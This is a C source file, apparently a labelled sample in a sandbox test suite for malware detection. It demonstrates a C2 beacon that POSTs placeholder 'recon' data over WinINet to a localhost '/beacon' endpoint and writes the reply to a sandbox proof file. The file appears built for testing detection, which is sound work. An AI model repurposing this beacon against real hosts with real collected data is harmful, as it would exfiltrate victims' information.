// SAMPLE: g6_02 | HTTPPostWinINet | Group: C2 Network & Exfiltration
// Technique: HTTP POST Telemetry via WinINet
// Compile: x86_64-w64-mingw32-gcc -O2 -o g6_02_http_post_wininet.exe g6_02_http_post_wininet.c -lwininet
// PROOF WRITTEN FROM RAW SERVER RESPONSE — no client-side signature logic

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")

#define C2_HOST        "127.0.0.1"
#define C2_PORT        8002
#define C2_PATH        "/beacon"
#define PROOF_PATH     "C:\\C1_Sandbox\\c1_proof.txt"
#define RECV_BUF_SIZE  4096

static const char *POST_HEADERS =
    "Content-Type: application/x-www-form-urlencoded\r\n";

static const char *POST_BODY =
    "sample_id=g6_02_http_post_wininet&data=RECON_PLACEHOLDER";

int main(void) {
    HINTERNET hInternet = NULL;
    HINTERNET hConnect  = NULL;
    HINTERNET hRequest  = NULL;
    char      recvBuf[RECV_BUF_SIZE];
    DWORD     bytesRead = 0;
    int       ret       = EXIT_FAILURE;

    DWORD postLen = (DWORD)strlen(POST_BODY);

    /* Open WinINet session */
    hInternet = InternetOpenA(
        "C1Beacon/1.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL, NULL, 0);
    if (!hInternet) {
        fprintf(stderr, "[g6_02] InternetOpenA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Connect to C2 server */
    hConnect = InternetConnectA(
        hInternet,
        C2_HOST,
        (INTERNET_PORT)C2_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0);
    if (!hConnect) {
        fprintf(stderr, "[g6_02] InternetConnectA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Open POST request */
    hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        C2_PATH,
        NULL, NULL, NULL,
        0, 0);
    if (!hRequest) {
        fprintf(stderr, "[g6_02] HttpOpenRequestA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Send POST with body */
    if (!HttpSendRequestA(
            hRequest,
            POST_HEADERS, (DWORD)strlen(POST_HEADERS),
            (LPVOID)POST_BODY, postLen)) {
        fprintf(stderr, "[g6_02] HttpSendRequestA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    /* Read response body */
    if (!InternetReadFile(hRequest, recvBuf, sizeof(recvBuf) - 1, &bytesRead)) {
        fprintf(stderr, "[g6_02] InternetReadFile failed: %lu\n", GetLastError());
        goto cleanup;
    }

    if (bytesRead == 0) {
        fprintf(stderr, "[g6_02] Empty response from C2 server — no proof written\n");
        goto cleanup;
    }

    /* Write raw server response directly to proof file — no formatting logic */
    HANDLE hProof = CreateFileA(
        PROOF_PATH,
        GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hProof == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[g6_02] CreateFileA proof failed: %lu\n", GetLastError());
        goto cleanup;
    }
    DWORD written = 0;
    WriteFile(hProof, recvBuf, (DWORD)bytesRead, &written, NULL);
    CloseHandle(hProof);

    printf("[g6_02] POST telemetry sent; %lu bytes received; proof written to %s\n",
           bytesRead, PROOF_PATH);
    ret = EXIT_SUCCESS;

cleanup:
    if (hRequest)  InternetCloseHandle(hRequest);
    if (hConnect)  InternetCloseHandle(hConnect);
    if (hInternet) InternetCloseHandle(hInternet);
    return ret;
}
